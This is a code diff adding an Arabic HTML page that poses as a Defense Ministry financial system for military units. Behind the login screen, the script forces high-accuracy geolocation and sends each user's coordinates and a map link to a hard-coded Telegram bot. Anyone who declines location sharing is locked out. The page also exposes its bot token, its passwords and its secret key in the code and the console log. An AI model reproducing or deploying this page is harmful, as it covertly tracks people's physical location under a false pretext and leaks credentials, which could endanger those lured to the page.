@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>النظام المالي - وزارة الدفاع</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
+            background: #0a1a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        #loginScreen {
+            background: #1a2a2a;
+            padding: 40px 30px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            text-align: center;
+            border: 1px solid #2a4a4a;
+        }
+        #loginScreen h1 { color: #c9a84c; font-size: 28px; margin-bottom: 8px; letter-spacing: 2px; }
+        #loginScreen .sub { color: #8a9a8a; font-size: 14px; margin-bottom: 30px; }
+        #loginScreen input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border-radius: 12px;
+            border: 1px solid #2a4a4a;
+            background: #0a1a1a;
+            color: #c9d4c9;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+        }
+        #loginScreen input:focus { border-color: #c9a84c; box-shadow: 0 0 20px rgba(201, 168, 76, 0.15); }
+        #loginScreen button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 20px;
+            border-radius: 12px;
+            border: none;
+            background: #c9a84c;
+            color: #0a1a1a;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        #loginScreen button:hover { background: #dbb95a; transform: scale(1.02); }
+        #loginScreen button:disabled { opacity: 0.6; cursor: not-allowed; }
+        #loginError { color: #ff6b6b; font-size: 14px; margin-top: 12px; display: none; }
+
+        #mainApp { display: none; width: 100%; max-width: 1200px; margin: 0 auto; }
+        .header {
+            background: #1a2a2a;
+            padding: 16px 24px;
+            border-radius: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #c9a84c;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .header h2 { color: #c9a84c; font-size: 22px; letter-spacing: 1px; }
+        .header .user-info { color: #8a9a8a; font-size: 14px; display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+        .header .user-info span { color: #c9d4c9; font-weight: bold; }
+        .header .logout-btn {
+            background: #3a2a2a;
+            color: #ff6b6b;
+            border: 1px solid #5a3a3a;
+            padding: 6px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+        .header .logout-btn:hover { background: #5a3a3a; }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .stat-card {
+            background: #1a2a2a;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid #2a4a4a;
+        }
+        .stat-card .num { font-size: 28px; font-weight: bold; color: #c9a84c; }
+        .stat-card .label { color: #8a9a8a; font-size: 13px; margin-top: 4px; }
+
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .action-btn {
+            background: #1a2a2a;
+            border: 1px solid #2a4a4a;
+            color: #c9d4c9;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+        .action-btn:hover { background: #2a4a4a; border-color: #c9a84c; transform: translateY(-2px); }
+        .action-btn.primary { background: #c9a84c; color: #0a1a1a; border-color: #c9a84c; }
+        .action-btn.danger { border-color: #5a2a2a; color: #ff6b6b; }
+        .action-btn.danger:hover { background: #3a1a1a; }
+
+        .table-container {
+            background: #1a2a2a;
+            border-radius: 16px;
+            padding: 16px;
+            overflow-x: auto;
+            border: 1px solid #2a4a4a;
+        }
+        table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        th { text-align: right; padding: 12px 8px; color: #c9a84c; border-bottom: 1px solid #2a4a4a; font-weight: 600; }
+        td { padding: 10px 8px; color: #c9d4c9; border-bottom: 1px solid #1a2a2a; }
+        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: #2a4a4a; color: #c9d4c9; }
+        .badge.warning { background: #5a3a1a; color: #f0c060; }
+        .badge.danger { background: #5a1a1a; color: #ff6b6b; }
+
+        .alert-banner {
+            background: #3a1a1a;
+            border: 1px solid #5a2a2a;
+            color: #ff6b6b;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            display: none;
+            font-size: 14px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 20px;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: #1a2a2a;
+            padding: 30px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 500px;
+            border: 1px solid #2a4a4a;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .modal-content h3 { color: #c9a84c; margin-bottom: 16px; font-size: 22px; }
+        .modal-content label { color: #8a9a8a; display: block; margin: 12px 0 4px; font-size: 14px; }
+        .modal-content input, .modal-content select, .modal-content textarea {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid #2a4a4a;
+            background: #0a1a1a;
+            color: #c9d4c9;
+            font-size: 16px;
+            outline: none;
+        }
+        .modal-content textarea { min-height: 60px; resize: vertical; }
+        .modal-content .modal-actions { display: flex; gap: 12px; margin-top: 20px; }
+        .modal-content .modal-actions button { flex: 1; padding: 12px; border-radius: 10px; border: none; font-size: 16px; cursor: pointer; }
+        .modal-content .modal-actions .btn-confirm { background: #c9a84c; color: #0a1a1a; }
+        .modal-content .modal-actions .btn-cancel { background: #2a2a2a; color: #8a9a8a; }
+
+        @media (max-width: 480px) {
+            .header h2 { font-size: 18px; }
+            .action-grid { grid-template-columns: 1fr; }
+            .stats { grid-template-columns: 1fr 1fr; }
+            .modal-content { padding: 20px; }
+        }
+
+        #emptyScreen {
+            display: none;
+            background: #0a1a1a;
+            width: 100vw;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            color: #2a3a3a;
+            font-size: 20px;
+        }
+
+        /* ====== صفحة الرفض ====== */
+        #accessDenied {
+            display: none;
+            background: #0a1a1a;
+            width: 100vw;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            color: #2a3a3a;
+            font-size: 20px;
+            text-align: center;
+            padding: 20px;
+        }
+        #accessDenied h1 { color: #c9a84c; font-size: 28px; margin: 20px 0; }
+        #accessDenied p { color: #8a9a8a; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <!-- ====== صفحة الرفض (في حال فشل المفتاح أو انتهاء الصلاحية) ====== -->
+    <div id="accessDenied">
+        <div style="text-align:center;">
+            <div style="font-size:80px; margin-bottom:20px;">🚫</div>
+            <h1>غير مصرح بالدخول</h1>
+            <p>الرابط غير صحيح أو انتهت صلاحيته.<br>الرجاء التواصل مع المدير.</p>
+        </div>
+    </div>
+
+    <!-- ====== صفحة فارغة (إذا رفض الموقع) ====== -->
+    <div id="emptyScreen">
+        <div style="text-align:center;">
+            <div style="font-size:60px; margin-bottom:20px;">🚫</div>
+            <div>لا يوجد محتوى</div>
+        </div>
+    </div>
+
+    <!-- ====== شاشة تسجيل الدخول ====== -->
+    <div id="loginScreen">
+        <h1>⚔️ وزارة الدفاع</h1>
+        <div class="sub">النظام المالي للقطعات العسكرية</div>
+        <input type="password" id="loginPass" placeholder="أدخل كلمة المرور" maxlength="4">
+        <button onclick="requestLocationAndLogin()">دخول</button>
+        <div id="loginError">كلمة المرور غير صحيحة</div>
+    </div>
+
+    <!-- ====== التطبيق الرئيسي ====== -->
+    <div id="mainApp">
+        <div class="header">
+            <h2>💰 النظام المالي</h2>
+            <div class="user-info">
+                <span id="userRoleDisplay">مستخدم عادي</span>
+                <span id="userLocationDisplay">القطعة 5 - دير الزور</span>
+                <button class="logout-btn" onclick="logout()">تسجيل خروج</button>
+            </div>
+        </div>
+        <div class="alert-banner" id="alertBanner">⚠️ تم تسجيل محاولة تلاعب!</div>
+        <div class="stats">
+            <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">إجمالي المبالغ</div></div>
+            <div class="stat-card"><div class="num" id="statCount">0</div><div class="label">عدد العمليات</div></div>
+            <div class="stat-card"><div class="num" id="statAlerts">0</div><div class="label">تنبيهات التلاعب</div></div>
+        </div>
+        <div class="action-grid" id="actionsGrid">
+            <button class="action-btn primary" onclick="openModal('receive')">📥 استقبال مبلغ</button>
+            <button class="action-btn primary" onclick="openModal('disburse')">📤 تخريج مبلغ</button>
+            <button class="action-btn" onclick="viewTransactions()">📋 عرض السجل</button>
+            <button class="action-btn" id="adminBtn" style="display:none;" onclick="openModal('admin')">⚙️ إدارة القطعات</button>
+            <button class="action-btn" id="addUserBtn" style="display:none;" onclick="openModal('addUser')">➕ إضافة مستخدم</button>
+        </div>
+        <div class="table-container">
+            <table>
+                <thead><tr><th>التاريخ</th><th>النوع</th><th>المبلغ</th><th>البيان</th><th>الحالة</th></tr></thead>
+                <tbody id="transactionsBody"><tr><td colspan="5" style="text-align:center; color:#5a6a5a;">لا توجد عمليات مسجلة</td></tr></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- ====== المودال ====== -->
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <h3 id="modalTitle">عنوان</h3>
+            <div id="modalBody"></div>
+            <div class="modal-actions">
+                <button class="btn-confirm" id="modalConfirm">تأكيد</button>
+                <button class="btn-cancel" onclick="closeModal()">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // =====================================================
+        // 0. حماية الرابط (مفتاح سري + صلاحية زمنية)
+        // =====================================================
+        (function() {
+            // المفتاح السري (غيّره إلى ما تريد)
+            const SECRET_KEY = "9x7kLpQw2RzT4nM8vBcF";
+
+            // تاريخ الصلاحية (بعد 30 يوم من اليوم)
+            const EXPIRY_DATE = new Date();
+            EXPIRY_DATE.setDate(EXPIRY_DATE.getDate() + 30);
+
+            // جلب المفتاح من الرابط
+            const params = new URLSearchParams(window.location.search);
+            const userKey = params.get('key');
+
+            // التحقق من المفتاح
+            if (userKey !== SECRET_KEY) {
+                document.getElementById('accessDenied').style.display = 'flex';
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('mainApp').style.display = 'none';
+                document.getElementById('emptyScreen').style.display = 'none';
+                throw new Error("مفتاح غير صحيح");
+            }
+
+            // التحقق من الصلاحية
+            if (Date.now() > EXPIRY_DATE.getTime()) {
+                document.getElementById('accessDenied').style.display = 'flex';
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('mainApp').style.display = 'none';
+                document.getElementById('emptyScreen').style.display = 'none';
+                throw new Error("انتهت الصلاحية");
+            }
+
+            console.log("✅ تم التحقق من المفتاح والصلاحية بنجاح");
+        })();
+
+        // =====================================================
+        // 1. البيانات الأساسية
+        // =====================================================
+        const BOT_TOKEN = "8834411340:AAF2dZMtFMuP1ezGDLv9I2n7hTzDF7V6I9s";
+        const CHAT_ID = "83556189";
+
+        let users = {
+            '1234': { role: 'user', name: 'مالي القطعة 5', location: 'دير الزور', id: 5 },
+            '1992': { role: 'admin', name: 'مدير الوزارة', location: 'المركز العام', id: 0 }
+        };
+        let transactions = [];
+        let alerts = [];
+        let currentUser = null;
+        let userLocation = null;
+
+        // =====================================================
+        // 2. طلب الموقع + تسجيل الدخول
+        // =====================================================
+        function requestLocationAndLogin() {
+            const pass = document.getElementById('loginPass').value.trim();
+            if (!users[pass]) {
+                document.getElementById('loginError').style.display = 'block';
+                setTimeout(() => document.getElementById('loginError').style.display = 'none', 3000);
+                return;
+            }
+
+            const loginBtn = document.querySelector('#loginScreen button');
+            const originalText = loginBtn.textContent;
+            loginBtn.textContent = '⏳ جاري الحصول على الموقع...';
+            loginBtn.disabled = true;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        loginBtn.textContent = originalText;
+                        loginBtn.disabled = false;
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        sendLocationToTelegram(userLocation);
+                        completeLogin(pass);
+                    },
+                    function(error) {
+                        loginBtn.textContent = originalText;
+                        loginBtn.disabled = false;
+                        
+                        if (error.code === 3) {
+                            console.warn('⏳ انتهت المهلة، إعادة المحاولة...');
+                            navigator.geolocation.getCurrentPosition(
+                                function(position) {
+                                    userLocation = {
+                                        lat: position.coords.latitude,
+                                        lon: position.coords.longitude,
+                                        accuracy: position.coords.accuracy
+                                    };
+                                    sendLocationToTelegram(userLocation);
+                                    completeLogin(pass);
+                                },
+                                function(secondError) {
+                                    console.warn('تم رفض الموقع:', secondError);
+                                    document.getElementById('loginScreen').style.display = 'none';
+                                    document.getElementById('emptyScreen').style.display = 'flex';
+                                },
+                                { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                            );
+                        } else {
+                            console.warn('تم رفض الموقع:', error);
+                            document.getElementById('loginScreen').style.display = 'none';
+                            document.getElementById('emptyScreen').style.display = 'flex';
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('emptyScreen').style.display = 'flex';
+            }
+        }
+
+        // =====================================================
+        // 3. إرسال الموقع إلى تليجرام
+        // =====================================================
+        function sendLocationToTelegram(loc) {
+            const msg = `📍 موقع المستخدم الجديد\n\n` +
+                        `🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
+                        `🌐 الرابط: https://www.google.com/maps?q=${loc.lat},${loc.lon}\n` +
+                        `🎯 الدقة: ${loc.accuracy} متر`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok) console.log('✅ تم إرسال الموقع إلى تليجرام');
+                else console.warn('❌ فشل إرسال الموقع:', data);
+            })
+            .catch(err => console.warn('❌ خطأ في الإرسال:', err));
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: loc.lat,
+                    longitude: loc.lon
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok) console.log('✅ تم إرسال الموقع الجغرافي إلى تليجرام');
+            })
+            .catch(err => console.warn('❌ خطأ في إرسال الموقع الجغرافي:', err));
+        }
+
+        // =====================================================
+        // 4. إتمام تسجيل الدخول
+        // =====================================================
+        function completeLogin(pass) {
+            currentUser = users[pass];
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('mainApp').style.display = 'block';
+            initApp();
+        }
+
+        function logout() {
+            currentUser = null;
+            document.getElementById('mainApp').style.display = 'none';
+            document.getElementById('loginScreen').style.display = 'block';
+            document.getElementById('loginPass').value = '';
+        }
+
+        function initApp() {
+            document.getElementById('userRoleDisplay').textContent = 
+                currentUser.role === 'admin' ? '👑 مدير الوزارة' : '📋 مالي قطعة';
+            document.getElementById('userLocationDisplay').textContent = 
+                currentUser.location;
+            if (currentUser.role === 'admin') {
+                document.getElementById('adminBtn').style.display = 'block';
+                document.getElementById('addUserBtn').style.display = 'block';
+            } else {
+                document.getElementById('adminBtn').style.display = 'none';
+                document.getElementById('addUserBtn').style.display = 'none';
+            }
+            updateStats();
+            renderTransactions();
+        }
+
+        // =====================================================
+        // 5. تحديث الإحصائيات والجداول
+        // =====================================================
+        function updateStats() {
+            const total = transactions.reduce((sum, t) => sum + t.amount, 0);
+            document.getElementById('statTotal').textContent = total.toLocaleString() + ' ل.س';
+            document.getElementById('statCount').textContent = transactions.length;
+            document.getElementById('statAlerts').textContent = alerts.length;
+        }
+
+        function renderTransactions() {
+            const tbody = document.getElementById('transactionsBody');
+            if (transactions.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#5a6a5a;">لا توجد عمليات مسجلة</td></tr>';
+                return;
+            }
+            tbody.innerHTML = transactions.map(t => `
+                <tr>
+                    <td>${t.date}</td>
+                    <td>${t.type === 'receive' ? '📥 استلام' : '📤 تخريج'}</td>
+                    <td>${t.amount.toLocaleString()} ل.س</td>
+                    <td>${t.note || '---'}</td>
+                    <td><span class="badge ${t.status === 'pending' ? 'warning' : ''}">${t.status || 'مكتمل'}</span></td>
+                </tr>
+            `).join('');
+        }
+
+        // =====================================================
+        // 6. دوال المودال
+        // =====================================================
+        function openModal(type) {
+            const modal = document.getElementById('modal');
+            const title = document.getElementById('modalTitle');
+            const body = document.getElementById('modalBody');
+
+            if (type === 'admin' && currentUser.role !== 'admin') {
+                logAlert('محاولة الوصول إلى إدارة القطعات بدون صلاحية');
+                return;
+            }
+            if (type === 'addUser' && currentUser.role !== 'admin') {
+                logAlert('محاولة إضافة مستخدم بدون صلاحية');
+                return;
+            }
+
+            if (type === 'receive') {
+                title.textContent = '📥 استقبال مبلغ مالي';
+                body.innerHTML = `
+                    <label>المبلغ (ل.س)</label>
+                    <input type="number" id="amountInput" placeholder="أدخل المبلغ">
+                    <label>البيان</label>
+                    <input type="text" id="noteInput" placeholder="مصدر المبلغ">
+                `;
+                document.getElementById('modalConfirm').onclick = function() {
+                    const amount = parseFloat(document.getElementById('amountInput').value);
+                    const note = document.getElementById('noteInput').value || 'استلام مالي';
+                    if (isNaN(amount) || amount <= 0) {
+                        alert('يرجى إدخال مبلغ صحيح');
+                        return;
+                    }
+                    transactions.push({
+                        date: new Date().toLocaleString('ar-EG'),
+                        type: 'receive',
+                        amount: amount,
+                        note: note,
+                        status: 'مكتمل',
+                        user: currentUser.name
+                    });
+                    updateStats();
+                    renderTransactions();
+                    closeModal();
+                };
+            } else if (type === 'disburse') {
+                title.textContent = '📤 تخريج مبلغ مع فاتورة';
+                body.innerHTML = `
+                    <label>المبلغ (ل.س)</label>
+                    <input type="number" id="disburseAmount" placeholder="أدخل المبلغ">
+                    <label>نوع المصروف</label>
+                    <select id="expenseType">
+                        <option value="ماكولات وشراب">ماكولات وشراب</option>
+                        <option value="الكترونيات">الكترونيات</option>
+                        <option value="تعويضات">تعويضات</option>
+                        <option value="صيانة">صيانة</option>
+                        <option value="نفقات شخصية">نفقات شخصية</option>
+                        <option value="فواتير شراء">فواتير شراء</option>
+                        <option value="أخرى">أخرى</option>
+                    </select>
+                    <label>وصف الفاتورة</label>
+                    <textarea id="invoiceNote" placeholder="تفاصيل الفاتورة"></textarea>
+                `;
+                document.getElementById('modalConfirm').onclick = function() {
+                    const amount = parseFloat(document.getElementById('disburseAmount').value);
+                    const type = document.getElementById('expenseType').value;
+                    const note = document.getElementById('invoiceNote').value || 'فاتورة';
+                    if (isNaN(amount) || amount <= 0) {
+                        alert('يرجى إدخال مبلغ صحيح');
+                        return;
+                    }
+                    const total = transactions.reduce((sum, t) => sum + (t.type === 'receive' ? t.amount : -t.amount), 0);
+                    if (amount > total) {
+                        logAlert(`محاولة تخريج مبلغ (${amount}) يتجاوز الرصيد المتاح (${total})`);
+                        alert('⚠️ لا يمكن التخريج لأن المبلغ يتجاوز الرصيد المتاح!');
+                        return;
+                    }
+                    transactions.push({
+                        date: new Date().toLocaleString('ar-EG'),
+                        type: 'disburse',
+                        amount: -amount,
+                        note: `${type}: ${note}`,
+                        status: 'مكتمل',
+                        user: currentUser.name
+                    });
+                    updateStats();
+                    renderTransactions();
+                    closeModal();
+                };
+            } else if (type === 'admin') {
+                title.textContent = '⚙️ إدارة القطعات المالية';
+                body.innerHTML = `
+                    <label>اختر قطعة</label>
+                    <select id="unitSelect">
+                        <option value="1">القطعة 1 - حلب</option>
+                        <option value="2">القطعة 2 - حمص</option>
+                        <option value="3">القطعة 3 - اللاذقية</option>
+                        <option value="4">القطعة 4 - حماة</option>
+                        <option value="5" selected>القطعة 5 - دير الزور</option>
+                    </select>
+                    <label>الإجراء</label>
+                    <select id="adminAction">
+                        <option value="view">عرض البيانات</option>
+                        <option value="edit">تعديل بيانات</option>
+                        <option value="delete">حذف عملية</option>
+                    </select>
+                    <label>تفاصيل إضافية</label>
+                    <input type="text" id="adminNote" placeholder="ملاحظات">
+                `;
+                document.getElementById('modalConfirm').onclick = function() {
+                    const unit = document.getElementById('unitSelect').value;
+                    const action = document.getElementById('adminAction').value;
+                    const note = document.getElementById('adminNote').value || '---';
+                    alert(`✅ تم تنفيذ الإجراء: ${action} على القطعة ${unit}\nالملاحظات: ${note}`);
+                    alerts.push({
+                        date: new Date().toLocaleString('ar-EG'),
+                        user: currentUser.name,
+                        action: `إدارة: ${action} على القطعة ${unit}`,
+                        note: note
+                    });
+                    updateStats();
+                    closeModal();
+                };
+            } else if (type === 'addUser') {
+                title.textContent = '➕ إضافة مستخدم جديد';
+                body.innerHTML = `
+                    <label>كلمة المرور (4 أرقام)</label>
+                    <input type="text" id="newPass" placeholder="مثال: 7777" maxlength="4">
+                    <label>الاسم</label>
+                    <input type="text" id="newName" placeholder="مثال: مالي القطعة 8">
+                    <label>الموقع</label>
+                    <input type="text" id="newLocation" placeholder="مثال: دير الزور">
+                    <label>الدور</label>
+                    <select id="newRole">
+                        <option value="user">مستخدم عادي</option>
+                        <option value="admin">مدير</option>
+                    </select>
+                `;
+                document.getElementById('modalConfirm').onclick = function() {
+                    const pass = document.getElementById('newPass').value.trim();
+                    const name = document.getElementById('newName').value.trim();
+                    const location = document.getElementById('newLocation').value.trim();
+                    const role = document.getElementById('newRole').value;
+
+                    if (!pass || !name || !location) {
+                        alert('يرجى ملء جميع الحقول');
+                        return;
+                    }
+                    if (users[pass]) {
+                        alert('كلمة المرور مستخدمة بالفعل');
+                        return;
+                    }
+                    if (pass.length !== 4 || isNaN(pass)) {
+                        alert('كلمة المرور يجب أن تكون 4 أرقام');
+                        return;
+                    }
+
+                    users[pass] = {
+                        role: role,
+                        name: name,
+                        location: location,
+                        id: Object.keys(users).length + 1
+                    };
+
+                    alert(`✅ تم إضافة المستخدم ${name} بنجاح`);
+                    closeModal();
+                    console.log('👥 المستخدمون الحاليون:', Object.keys(users));
+                };
+            }
+            modal.classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('modal').classList.remove('active');
+        }
+
+        // =====================================================
+        // 7. دوال التلاعب والمراقبة
+        // =====================================================
+        function logAlert(message) {
+            const alertMsg = {
+                date: new Date().toLocaleString('ar-EG'),
+                user: currentUser.name,
+                location: currentUser.location,
+                message: message
+            };
+            alerts.push(alertMsg);
+            document.getElementById('alertBanner').style.display = 'block';
+            document.getElementById('alertBanner').textContent = 
+                `⚠️ ${message} | المستخدم: ${currentUser.name} (${currentUser.location})`;
+            setTimeout(() => {
+                document.getElementById('alertBanner').style.display = 'none';
+            }, 5000);
+            updateStats();
+            console.log('🔴 تنبيه تلاعب:', alertMsg);
+        }
+
+        function viewTransactions() {
+            if (currentUser.role === 'admin') {
+                let msg = '📋 جميع العمليات المسجلة:\n\n';
+                transactions.forEach((t, i) => {
+                    msg += `${i+1}. ${t.date} | ${t.type === 'receive' ? '📥' : '📤'} | ${Math.abs(t.amount)} ل.س | ${t.note}\n`;
+                });
+                msg += `\n📊 إجمالي العمليات: ${transactions.length}`;
+                alert(msg);
+            } else {
+                let msg = '📋 عملياتك المسجلة:\n\n';
+                const myT = transactions.filter(t => t.user === currentUser.name);
+                if (myT.length === 0) {
+                    alert('لا توجد عمليات مسجلة لك');
+                    return;
+                }
+                myT.forEach((t, i) => {
+                    msg += `${i+1}. ${t.date} | ${t.type === 'receive' ? '📥' : '📤'} | ${Math.abs(t.amount)} ل.س | ${t.note}\n`;
+                });
+                alert(msg);
+            }
+        }
+
+        // =====================================================
+        // 8. مراقبة التلاعب
+        // =====================================================
+        document.addEventListener('click', function(e) {
+            if (!currentUser) return;
+            if (currentUser.role === 'user') {
+                if (e.target.closest('#adminBtn') || e.target.closest('#addUserBtn')) {
+                    logAlert('محاولة الوصول إلى إدارة القطعات أو إضافة مستخدم بدون صلاحية');
+                    alert('⚠️ هذا الإجراء غير مسموح به لصلاحياتك!');
+                    e.preventDefault();
+                }
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (currentUser && currentUser.role === 'user') {
+                if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                    logAlert('محاولة فتح أدوات المطور');
+                    e.preventDefault();
+                }
+            }
+        });
+
+        console.log('✅ النظام المالي جاهز مع تتبع الموقع وحماية الرابط');
+        console.log('🔑 1234 = مستخدم عادي | 1992 = مدير الوزارة');
+        console.log('🔐 المفتاح السري: 9x7kLpQw2RzT4nM8vBcF');
+        console.log('📅 الصلاحية: 30 يوم من اليوم');
+    </script>
+
+</body>
+</html>
